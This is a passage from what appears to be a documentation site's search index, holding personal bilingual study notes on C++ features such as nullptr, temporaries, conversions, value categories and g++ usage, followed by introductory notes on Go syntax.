)0\u4f5c\u4e3a\u7a7a\u6307\u9488\uff0c\u5728c++11\u4e4b\u524d\uff0c\u7a7a\u6307\u9488\u5e38\u91cf\u5c31\u662f\u503c\u4e3a0\u7684\u6574\u578b\u91cfint p=0; \u4f46\u662f\u8fd9\u6837\u505a\u6709\u4e00\u4e2a\u95ee\u9898\uff0c0\u88ab\u5b9a\u4e49\u4e3a\u4e00\u4e2a\u7a7a\u6307\u9488\u5e38\u91cf\u4e4b\u524d\uff0c\u5176\u9996\u5148\u662f\u662f\u4e00\u4e2a\u6574\u5f62\uff0c\u53ea\u4e0d\u8fc7\u80fd\u591f\u9690\u5f0f\u8f6c\u6362\u4e3a\u7a7a\u6307\u9488\u7f62\u4e86\uff0c\u770b\u5982\u4e0b\u4f8b\u5b50</p> <pre><code>void f(int *);\nvoid f(int);\nf(0);  //\u9762\u5bf9\u4e0a\u8ff0\u51fd\u6570\u91cd\u8f7d\u60c5\u51b5\uff0cf\uff080\uff09\u8fd8\u662f\u4f1a\u9009\u62e9\u8c03\u7528f\uff08int\uff09\u7684\u5185\u5bb9\n//\u4e3a\u4e86\u8ba9\u8fd9\u4e2a\u51fd\u6570\u91cd\u8f7d\u80fd\u591f\u6210\u529f\u4f7f\u7528\n//c++\u4e2d\u5b9a\u4e49\u4e86\u4e00\u4e2anullptr\uff0c\u6765cover\u4e0a\u8ff0\u60c5\u51b5\nf(nullptr)//\u5c31\u4f1a\u8c03\u7528\u7b2c\u4e00\u4e2a\u51fd\u6570\uff0c\u5e76\u4e14\u53c2\u6570\u662f\u7a7a\u6307\u9488\n</code></pre> <p>0\u548cnullptr\u90fd\u662f\u7a7a\u6307\u9488\u5e38\u91cf</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_10","title":"\u4e34\u65f6\u5bf9\u8c61","text":"<p>\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u6211\u4eec\u4f1a\u751f\u6210\u4e00\u4e9b\u4e34\u65f6\u7684\u5bf9\u8c61\uff0c\u4f8b\u5982</p> <pre><code>print(m1-m2);\n</code></pre> <p>m1\u548cm2\u90fd\u662f\u5bf9\u8c61\uff0c\u5047\u8bbe\u6211\u4eec\u81ea\u5b9a\u4e49\u8fd9\u4e2a\u51cf\u53f7\u8fd0\u7b97\u7b26\uff0c\u5b83\u662f\u6709\u8fd4\u56de\u503c\u7684\uff0c\u4f46\u6b64\u65f6\u5b83\u7684\u8fd4\u56de\u503c\u5e76\u6ca1\u6709\u4e1c\u897f\u53bb\u63a5\u53d7\uff0c\u6709\u4e00\u4e2a\u51fd\u6570\u63a5\u53d7\u4e86\uff0c\u4e4b\u540e\u8fd9\u4e2a\u8fd4\u56de\u503c\u5c31\u4f5c\u4e3a \u4e34\u65f6\u7684\u53d8\u91cf\u9500\u6bc1\u6389\u4e86\uff0c\u671f\u95f4\u5b58\u5728\u6790\u6784\u51fd\u6570\u7684\u8c03\u7528\uff0c\u5176\u9500\u6bc1\u7684\u65f6\u673a\u5728\u4e8e\u9047\u5230\u8bed\u53e5\u7684\u7b2c\u4e00\u4e2a\u5206\u53f7\";\"\u65f6</p> <pre><code>ClassM m=m1-m2;\n</code></pre> <p>\u5728\u4e0a\u8ff0\u60c5\u5f62\u4e0b\uff0c\u5b9e\u9645\u4e0a\u53d1\u751f\u4e00\u6b21\u6784\u9020\u548c\u4e00\u6b21\u6790\u6784\uff0cm1-m2\u7684\u8fd4\u56de\u503c\u8981\u53bb\u5e2e\u52a9m\u8fdb\u884c\u6784\u9020\uff0c\u7ed3\u675f\u4e4b\u540e\u8fd9\u4e2a\u8fd4\u56de\u7684\u4e34\u65f6\u5bf9\u8c61\u5c31\u6790\u6784\u6389\u4e86\uff0c\u8fd9\u6837\u505a\u65e0\u7591\u662f\u4e00\u79cd\u6d6a\u8d39</p> <p>\u4e8e\u662f\u6211\u4eec\u6709</p> <pre><code>const ClassM &amp;m=m1-m2;\n</code></pre> <p>\u8fd9\u6837\u5b50\u76f8\u5f53\u4e8e\u7528\u4e00\u4e2a\u5e38\u91cf\u5f15\u7528\uff0c\u5ef6\u957f\u4e86\u8fd9\u4e2a\u4e34\u65f6\u53d8\u91cf\u7684\u751f\u547d\u5468\u671f \u4f46\u662f\uff0c\u4e0d\u53ef\u4ee5\u7528non-const reference \u53bb\u5ef6\u957f\u4e34\u65f6\u53d8\u91cf\u7684\u751f\u547d\u5468\u671f</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#namespace-and-scope","title":"\u547d\u540d\u7a7a\u95f4\u548c\u4f5c\u7528\u57df namespace and scope","text":"<p>\u591a\u6587\u4ef6  \u7c7b\u578b\u8f6c\u6362\u548c\u6784\u9020\u51fd\u6570</p> <p>int (test)[10] \u548c int test[10]</p> <p>One class will create a new scope, and we can define a class in another class. It can have the same name with other classes define outside.</p> <pre><code>class Inner{...};\nclass Outer{\n    class Inner{...}; //we can just declare here\n    ...\n    Inner A; //\u5185\u90e8\n    Outer::Inner B; //\u5185\u90e8\n    ::Inner C;  //\u5168\u5c40\n}\n\nclass Outer::Inner {\n    //we can really define the Outer::Inner class here.\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#implicit-conversion-and-explicit-conversion","title":"\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362\u548c\u663e\u793a\u7c7b\u578b\u8f6c\u6362 implicit conversion and explicit conversion","text":"<p>\u8f83\u5927\u7c7b\u578b\u8f6c\u6362\u7684\u90e8\u5206\u4fdd\u7559</p> <p>Here are some examples</p> <pre><code>int i;\ni='c';      //implicit conversion\ni=(int)'c'; //explicit conversion c-style cast\ni=int('c'); //explicit conversion function-style cast\n</code></pre> <p>Before we have mentioned that constructor function in cpp is more like a function-style cast, now we can see that there are many rules of implicit conversion in C, constructor function will be a part of them. When we pass paremeters into function, they will use their constructor function.</p> <pre><code>void func(classA a);\nint main(){\n    func(1); //classA a=classA(1);\n}\n</code></pre> <p>If we don't want this constructor happened implicitly, we can use keyword explicit</p> <pre><code>class classA{\nprivate:\n    int x;\npublic:\n    explicit classA(int i):x(i){}\n};\nvoid func(classA a);\nint main(){\n    func(1); //error\n    classA a=1; //error\n}\n</code></pre> <p>There also are some differences in constructor function and stanard conversion. We call the constructor function user-define conversion. When the type conversion happens, we first refer to stanard conversion then use user-define conversion. Besides, user-define conversion can happne once at most.</p> <pre><code>class classA{public: classA(int i){}};\nclass classB{public: classB(classA a){}};\nvoid func(classB b);\nint main(){\n    func(1);//error \u4ed6\u65e0\u6cd5\u901a\u8fc7\u4e24\u6b21\u6784\u9020\u8fdb\u5165\u51fd\u6570\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#lambda-expression","title":"lambda expression","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#c-file-io","title":"c++ file IO","text":"<pre><code>#include&lt;fstream&gt;\nint main(){\n    string buff;\n    ofstream File1(\"test.txt\");\n    File1&lt;&lt;\"Hello\"; //\u5199\u5165\n    ifstream File2(\"test2.txt\");\n    File2&gt;&gt;buff; //\u8bfb\u5165\n}\n</code></pre> <p>C++\u6709\u4e09\u79cd\u6587\u4ef6\u6d41 \u5206\u522b\u662fifstream(\u4ece\u6587\u4ef6\u8f93\u5165) ofstream(\u8f93\u51fa\u5230\u6587\u4ef6) fstream(\u8f93\u5165\u8f93\u51fa)</p> <p>\u5728\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u5019\u9664\u4e86\u786e\u5b9a\u8f93\u5165\u8f93\u51fa\uff0c\u8fd8\u8981\u786e\u5b9a\u662f\u4ee5\u4ec0\u4e48\u5f62\u5f0f\u6253\u5f00\u6587\u4ef6\u3002</p> <p>C++\u5b9a\u4e49\u4e86\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u683c\u5f0f\u5316\u6587\u5b57\u6a21\u5f0f\uff0c\u8bfb\u53d6\u5b57\u7b26\uff1b\u4e00\u79cd\u662f\u4e8c\u8fdb\u5236\u6a21\u5f0f\u3002\u9ed8\u8ba4\u4e3a\u683c\u5f0f\u5316\u6587\u5b57\u6a21\u5f0f</p> <p>\u6253\u5f00\u6587\u4ef6</p> <pre><code>fstream file;\nfile.open(\"\u6587\u4ef6\u540d\",\"\u6253\u5f00\u65b9\u5f0f\");//\u6253\u5f00\u65b9\u5f0f\u89c1PPT 90 \u9ed8\u8ba4\u4e3aios::in\n//\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5199\u4f5c\u6784\u9020\u51fd\u6570\nfstream anofile(\"\u6587\u4ef6\u540d\",\"\u6253\u5f00\u65b9\u5f0f\");\n</code></pre> <p>\u5173\u95ed\u6587\u4ef6</p> <pre><code>fstream file(\"abc.txt\");\nfile.close();\n</code></pre> <p>\u6587\u4ef6\u6307\u9488</p> <p>C++\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86</p> <p>\u6587\u4ef6\u8bfb\u5199</p> <p>\u4e00\u822c\u53ef\u4ee5\u7528&gt;&gt; \u548c&lt;&lt; \u8fdb\u884c\u7b80\u5355\u7684\u8bfb\u5199\u64cd\u4f5c</p> <p>\u6587\u4ef6\u5224\u65ad</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_11","title":"\u5de6\u503c\u548c\u53f3\u503c\u5f15\u7528","text":"<p>\u5bf9\u4e8ec\u8bed\u8a00\u800c\u8a00<code>int x=1;</code>\u200b x\u662fint\uff0c1\u4e5f\u662fint\uff0c\u4f46\u662fx\u53ef\u4ee5\u505a\u5de6\u503c\u800c1\u4e0d\u884c\uff0c\u56e0\u4e3a\u5728c\u8bed\u8a00\u4e2d1\u8fd9\u6837\u7684\u4e34\u65f6\u53d8\u91cf\u662f\u6709\u53ef\u80fd\u88ab\u6c47\u7f16\u4e2d\u7684\u7acb\u5373\u6570 \u5b9e\u73b0\u7684\uff0c\u6240\u4ee5\u4e0d\u53ef\u4ee5\u5c06\u5176\u505a\u5de6\u503c</p> <p>\u5de6\u503c\u662f\u53ef\u4ee5\u627e\u51fa\u5730\u5740\u7684\u4e1c\u897f\u3002</p> <p>\u4f46\u662f\u5728c++\u4e2d\u5b58\u5728\u4e00\u4e9b\u503c\u5f97\u8ba8\u8bba\u7684\u60c5\u51b5</p> <pre><code>Foo func(); //\u8fd9\u4e2afunc\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\nint x=func().y; //\u6b64\u65f6\u8fd9\u4e2afunc()\u8fd4\u56de\u4e00\u4e2a\u4e34\u65f6\u53d8\u91cf\uff0c\u4f46\u662f\u53c8\u6210\u4e3a\u4e86\u5de6\u503c\n</code></pre> <p>\u56e0\u6b64\u5728c++\u4e2d\uff0c\u8fd9\u79cd\u5206\u914d\u6a21\u5f0f\u53d1\u751f\u4e86\u6539\u53d8</p> <p>prvalue \u4e34\u65f6\u53d8\u91cf \u4e0d\u5360\u5185\u5b58\uff08\u4ece\u8bbe\u8ba1\u610f\u4e49\u4e0a\uff09</p> <p>\u8fd9\u4e9b\u503c\u7528\u4e8e\u4f5c\u4e3a\u5185\u7f6e\u8fd0\u7b97\u7b26\u7684\u64cd\u4f5c\u6570\u548c\u521d\u59cb\u5316\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5f53\u53d1\u751f</p> <pre><code>const int &amp; i=1;\n</code></pre> <p>\u8f6c\u6362\u6210xvalue</p> <p>xvalue \u4e34\u65f6\u53d8\u91cf \u4f46\u662f\u5360\u5185\u5b58</p> <p>\u4efb\u4f55\u5b8c\u6574\u7684\u7c7b\u578b\u7684\u4e00\u4e2aprvalue\u90fd\u53ef\u4ee5\u8f6c\u6362\u6210xvalue</p> <p>\u8fd9\u4e2a\u8f6c\u6362\u8fc7\u7a0b\u79f0\u4e3atemporary metralization\uff0c\u5728\u5982\u4e0b\u60c5\u51b5\u53d1\u751f</p> <ol> <li>\u7ed9prvalue\u7ed1\u5b9a\u5f15\u7528</li> <li>\u5bf9prvalue\u8fdb\u884c\u6210\u5458\u8bbf\u95ee <code>func().x</code>\u200b</li> <li>\u200d</li> </ol> <p>\u200d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_12","title":"\u5185\u5b58\u5206\u914d","text":"<p>global data: global data, all static data. stack: local data heap: dynamically allocated data</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#cpp","title":"cpp \u7a0b\u5e8f\u7ec4\u7ec7","text":"<p>cpp\u7684\u7a0b\u5e8f\u4e3b\u8981\u7531\uff0c\u7c7b\u58f0\u660e\u6587\u4ef6.h\uff0c\u7c7b\u5b9e\u73b0\u6587\u4ef6.cpp\uff0c\u7c7b\u4f7f\u7528\u6587\u4ef6main.cpp</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#using-gcc-and-gdb","title":"using gcc and gdb","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#using-g","title":"using g++","text":"<p>\u4f7f\u7528g++\u7684\u57fa\u672c\u547d\u4ee4</p> <pre><code>g++ -E hello.cpp -o hello.i\ng++ -S hello.i  -o  hello.s\ng++ -c hello.s -o hello.o\ng++ hello.o  -o  hello\n//\u4ee5\u4e0a\u56db\u6b65\u4e3a\u5b8c\u6574\u7684\u7f16\u8bd1\u547d\u4ee4\n\ng++  hello.cpp -o  hello\n//\u8fd9\u4e00\u6b65\u53ef\u4ee5\u4f7f\u7684\u7f16\u8bd1\u8fc7\u7a0b\u4e00\u6b65\u5230\u4f4d\uff0c\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6\n\n./hello.exe\n//\u6700\u540e\u7684\u8fd0\u884c \u5728git bash\u4e2d\n\n//\u591a\u6587\u4ef6\ng++ -o YourProgram class1.cpp class2.cpp\n//\u7136\u540e\u4f60\u4f1a\u5f97\u5230YourProgram.exe\n</code></pre> <p>In the git bash we want to use a .exe file we should write ./a.exe</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/","title":"Go \u5165\u95e8","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#golang-basic","title":"golang basic","text":"<ul> <li>Go Proxy \u5df2\u6362\u6e90</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#1","title":"1. \u591a\u6587\u4ef6","text":"<p>\u5bf9\u4e8eGo\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u540d\u5b57\u662f\u5927\u5199\u5b57\u6bcd\u5f00\u5934\u7684\uff0c\u5176\u5c31\u662f\u5df2\u7ecf\u5bfc\u51fa\u7684</p> <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"math\"\n)\n\nfunc main() {\n    fmt.Println(math.Pi) // \u6b63\u786e\u8fd0\u884c\n    fmt.Println(math.pi) // \u62a5\u9519\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#2","title":"2. \u51fd\u6570","text":"<pre><code>func add(x int, y int) int {\n    return x + y\n}\n</code></pre> <p>\u7c7b\u578b\u653e\u5728\u53d8\u91cf\u540d\u540e\u9762\uff0c\u8fd4\u56de\u7c7b\u578b\u653e\u5728\u51fd\u6570\u540d\u540e\u9762\uff0c\u652f\u6301\u591a\u503c\u8fd4\u56de</p> <pre><code>func swap(x string, y string) (string, string){\n    return y,x\n}\nx,y = swap(x,y)\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#3","title":"3. \u53d8\u91cf\u548c\u53d8\u91cf\u58f0\u660e","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#31","title":"3.1 \u57fa\u7840\u7684\u53d8\u91cf","text":"<p>\u4e00\u822c\u7684\u53d8\u91cf\u58f0\u660e\u548c\u5b9a\u4e49\u9075\u5b88\u7740\u7c7b\u578b\u653e\u540e\u9762\u7684\u539f\u5219</p> <pre><code>var i int = 2;\n</code></pre> <p>\u200b\u200b</p> <p>\u77ed\u8d4b\u503c\u8bed\u53e5</p> <pre><code>i:=10\n</code></pre> <p>\u4e00\u822c\u4f5c\u4e3a\u4e34\u65f6\u53d8\u91cf\u4e4b\u7c7b\u7684\u4f7f\u7528\uff0c\u4f1a\u81ea\u52a8\u63a8\u5bfc\u7c7b\u578b</p> <p>\u96f6\u503c</p> <p>\u5bf9\u4e8e\u90a3\u4e9b\u6ca1\u6709\u521d\u59cb\u5316\u7684\u58f0\u660e\u53d8\u91cf\uff0c\u4f1a\u6839\u636e\u7c7b\u578b\u8d4b\u503c\u201c\u96f6\u503c\u201d\uff0c\u4f8b\u59820\uff0cfalse\uff0c\u201c\u201d</p> <p>\u7c7b\u578b\u8f6c\u6362</p> <p>Go\u5bf9\u4e8e\u7c7b\u578b\u53d8\u6362\u7684\u8981\u6c42\u8f83\u4e3a\u4e25\u683c\uff0c\u5728\u5404\u79cd\u5730\u65b9\u5747\u8981\u6c42\u663e\u793a\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u751a\u81f3\u5305\u62ec\u6574\u5f62\u548c\u6d6e\u70b9\u578b\u7684\u52a0\u51cf</p> <pre><code>package main\n\nimport (\n    \"fmt\"\n)\n\nfunc main() {\n    var x int = 3\n    var y float64 = 3.0\n    fmt.Println(x+y) \u62a5\u9519\n}\n</code></pre> <p>\u5e38\u91cf\u548c\u53d8\u91cf</p> <p>const\u8868\u793a\u5e38\u91cf\uff0cvar\u8868\u793a\u53d8\u91cf</p> <pre><code>const x int = 3\nvar y int = 3\n</code></pre> <p>\u200d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#32","title":"3.2 \u52a8\u6001\u5185\u5b58\u5206\u914d","text":"<p>\u5728C/C++\u4e2d\uff0c\u6211\u4eec\u8ba4\u4e3a\u7684\u52a8\u6001\u5185\u5b58\u5206\u914d\u5747\u662f\u5728\u5806\u4e0a\uff0c\u800c\u50cfJava\u8fd9\u6837\u7684GC\u8bed\u8a00\u4e3a\u4e86\u786e\u4fdd\u5b89\u5168\uff0c\u5c06\u5927\u90e8\u5206\u7684\u53d8\u91cf\u90fd\u7531\u786e\u5b9a\u5230\u4e86JVM\u7684\u5806\u4e0a\uff0c\u800cGo\u8bed\u8a00\u7531\u7f16\u8bd1\u5668\u786e\u5b9a\u8be5\u53d8\u91cf\u662f\u5426\u5e94\u8be5\u5206\u914d\u5728\u6808/\u5806\u4e0a\uff0c\u56e0\u6b64\u65e0\u9700\u6211\u4eec\u5173\u5fc3</p> <p>Go\u8bed\u8a00\u6709\u4e24\u79cd\u521b\u5efa\u53d8\u91cf\u7684\u5f62\u5f0f\uff0cmake\u548cnew\uff0cnew\u7528\u6765\u521b\u5efa\u5404\u79cd\u57fa\u7840\u7c7b\u578b\u7684\u6307\u9488</p> <pre><code>    i := new(int)\n    *i = 10\n\n    s := new(student)\n    *s = student{\"h\", 18}\n</code></pre> <p>\u4f7f\u7528make\u6765\u521b\u5efa\u53d8\u91cf\uff0c\u4ec5\u5305\u62ec\u4e09\u79cd\u5185\u7f6e\u7c7b\u578b</p> <ul> <li>\u5207\u7247</li> <li>\u54c8\u5e0c\u8868</li> <li>channel</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#4","title":"4. \u6d41\u7a0b\u63a7\u5236\u8bed\u53e5","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#41","title":"4.1 \u5faa\u73af\u8bed\u53e5","text":"<p>for\u5faa\u73af</p> <p>\u4e0d\u9700\u8981\u52a0\u5c0f\u62ec\u53f7\uff0c\u5fc5\u987b\u8981\u5927\u62ec\u53f7</p> <pre><code>var sum int = 0\nfor i:=0; i&lt;10; i++{\n    sum += 1\n}\n</code></pre> <p>\u5bf9\u4e8eGo\u8bed\u8a00\u4e0d\u9700\u8981while\uff0c\u53ef\u4ee5\u7528for\u66ff\u4ee3while</p> <pre><code>for sum &lt; 1000{\n    sum += 1\n}\n</code></pre> <p>\u65e0\u9650\u5faa\u73af</p> <pre><code>for{\n    sum+=1\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#42","title":"4.2 \u5206\u652f\u8bed\u53e5","text":"<p>if-else\u57fa\u7840\u8bed\u6cd5\u548cC\u76f8\u4f3c\uff0c\u4e0d\u9700\u8981\u5728\u6761\u4ef6\u5468\u56f4\u52a0\u4e0a\u62ec\u53f7\uff0c\u4f46\u540c\u65f6\u8fd8\u6709\u4e00\u4e9b\u4f18\u5316\uff0c\u4f8b\u5982\u6211\u4eec\u53ef\u4ee5\u5728\u6761\u4ef6\u4e2d\u505a\u4e00\u4e9b\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u4f8b\u5982\u4e0b\u9762\u7684\u8fd9\u4e2av\uff0c\u53ef\u4ee5\u5728\u5206\u652f\u7684\u5404\u4e2a\u6a21\u5757\u5185\u751f\u6548</p> <pre><code>func pow(x, n, lim float64) float64 {\n    if v := math.Pow(x, n); v &lt; lim {\n        return v\n    }else{\n        fmt.Printf(\"%f &gt;= %f\", v, lim)\n    }\n    return lim\n}\n</code></pre> <p>Go\u4e2d\u4e5f\u6709switch\u8bed\u53e5\uff0c\u6548\u679c\u548cC\u7c7b\u4f3c\uff0c\u4f46\u662f\u5728\u5404\u4e2a\u8bed\u53e5\u5757\u540e\u9762\u90fd\u6709break</p> <p>\u200d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#43-defer","title":"4.3 defer","text":"<p>Go\u4e2d\u6709\u4e00\u4e2adefer\u5173\u952e\u8bcd\uff0c\u5176\u540e\u9762\u5bf9\u5e94\u7684\u51fd\u6570\uff0c\u4f1a\u63a8\u8fdf\u5230\u5f53\u524d\u6240\u5728\u51fd\u6570\u5757\u7ed3\u675f\u8fd4\u56de\u524d\u8c03\u7528\uff0c\u4f46\u5185\u90e8\u7684\u53c2\u6570\u8ba1\u7b97\u4f1a\u6309\u7167\u6b63\u5e38\u987a\u5e8f\u5b8c\u6210</p> <pre><code>func main() {\n    defer fmt.Println(\"world\")\n\n    fmt.Println(\"hello\")\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#5","title":"5. \u7c7b\u578b","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#51","title":"5.1 \u6307\u9488","text":"<p>Go\u8bed\u8a00\u4e2d\u662f\u6709\u6307\u9488\u7684\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u5141\u8bb8\u8fdb\u884c\u6307\u9488\u8ba1\u7b97</p> <pre><code>func main() {\n    fmt.Println(Sqrt(2))\n    var i int = 10\n    var p *int = &amp;i\n    fmt.Println(*p)\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#52","title":"5.2 \u7ed3\u6784\u4f53","text":"<pre><code>type Vertex struct {\n    X int\n    Y int\n}\n</code></pre> <ul> <li>\u521b\u5efa\u7ed3\u6784\u4f53 <code>var temp = Vertex{0, 0}</code>\u200b</li> <li>\u521b\u5efa\u7ed3\u6784\u4f53\u6307\u9488 <code>var p = &amp;Vertex{0, 0}</code>\u200b</li> <li>\u6307\u9488\u548c\u5b57\u9762\u503c\u90fd\u53ef\u4ee5\u901a\u8fc7 <code>.</code>\u200b \u6765\u8bbf\u95ee\u5185\u90e8\u53d8\u91cf</li> </ul> <p>Go\u91cc\u9762\u6ca1\u6709\u7c7b\u4f3c\u4e8eC++\u7684\u7c7b\uff0c\u5f53\u6211\u4eec\u8981\u5bf9\u7ed3\u6784\u4f53\u5b9a\u4e49\u65b9\u6cd5\u65f6\uff0c\u91c7\u7528\u7684\u662f\u51fd\u6570\u7684\u8bed\u6cd5\u7cd6</p> <pre><code>func (v Vertex) Abs() float64{\n    return math.Sqrt(v.X * v.X + v.Y * v.Y);\n}\n\nv.Abs()\n</code></pre> <p>\u4f46\u5176\u5b9e\uff0c\u5f53\u6211\u4eec\u4e3a\u7ed3\u6784\u4f53\u7f16\u5199\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u66f4\u5e38\u7528\u7684\u662f\u5bf9\u5176\u6307\u9488\u7c7b\u578b\u7f16\u5199\u65b9\u6cd5\uff0c\u8fd9\u6837\u7684\u65b9\u6cd5\u53ef\u4ee5\u5b9e\u9645\u4fee\u6539\u7c7b\u7684\u5185\u90e8\u6210\u5458\uff0c\u9700\u8981\u6bd4\u8f83\u6ce8\u610f\u7684\u4e00\u70b9\u5728\u4e8e\uff0c\u4e00\u4e2a\u7ed3\u6784\u4f53\u5bf9\u8c61\u8c03\u7528\u8be5\u51fd\u6570\u7684\u65f6\u5019\uff0c\u82e5\u5176\u672c\u8eab\u4e0d\u4e3a\u6307\u9488\uff0c\u4e5f\u4f1a\u81ea\u52a8\u53d6\u5730\u5740\u4f5c\u4e3a\u6307\u9488\u4f7f\u7528</p> <pre><code>func (v *Vertex) Scale(f float64) {\n    v.X = v.X * f\n    v.Y = v.Y * f\n}\n</code></pre> <p>\u5f53\u6211\u4eec\u4e3a\u4e00\u4e2a\u7ed3\u6784\u4f53\u5b9a\u5236\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u9488\u5bf9\u503c\u548c\u6307\u9488\u90fd\u5e94\u8be5\u7f16\u5199\u76f8\u5e94\u7684\u65b9\u6cd5</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#53","title":"5.3 \u6570\u7ec4","text":"<pre><code>var a[10] int;\nprimes := [6]int{2, 3, 5, 7, 11, 13};\n</code></pre> <p>\u6570\u7ec4\u548cPython\u4e00\u6837\u53ef\u4ee5\u8fdb\u884c\u5207\u7247\u64cd\u4f5c</p> <pre><code>var a [10]int = [10]int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}\nvar temp = a[0:5]\nfmt.Println(temp)\n</code></pre> 